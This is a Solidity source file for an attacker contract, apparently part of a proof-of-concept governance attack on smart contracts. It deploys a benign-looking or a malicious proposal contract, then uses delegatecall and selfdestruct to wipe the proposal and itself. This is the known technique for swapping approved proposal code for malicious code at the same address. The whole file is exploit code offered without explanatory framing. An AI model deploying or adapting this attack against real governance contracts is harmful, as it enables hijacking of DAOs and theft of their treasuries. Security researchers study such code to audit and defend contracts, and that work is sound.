// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./AttackerDefaultProposal.sol";
import "./AttackerMaliciousProposal.sol";

interface DelegateProposal {
    function delegateCall(
        address target,
        bytes memory data
    ) external;
}

contract Attacker02 {
    
    address public attacker;

    function deploy(
        bool isDefault
    ) external returns (address addr) {
        if (isDefault) {
            AttackerDefaultProposal proposal = new AttackerDefaultProposal();
            addr = address(proposal);
        } else {
            AttackerMaliciousProposal proposal = new AttackerMaliciousProposal();
            addr = address(proposal);
        }
        attacker = addr;
    }

    function killAll() external {
        _killDefault();
        killSelf();
    }

    /**
     * Function to destroy this contract.
     */
    function killSelf() public {
        selfdestruct(payable(msg.sender));
    }

    /**
     * Function to destroy the proposal contract via delegatecall.
     */
    function _killDefault() private {
        DelegateProposal(attacker).delegateCall(
            address(this),
            abi.encodeWithSignature("killSelf()")
        );        
    }
}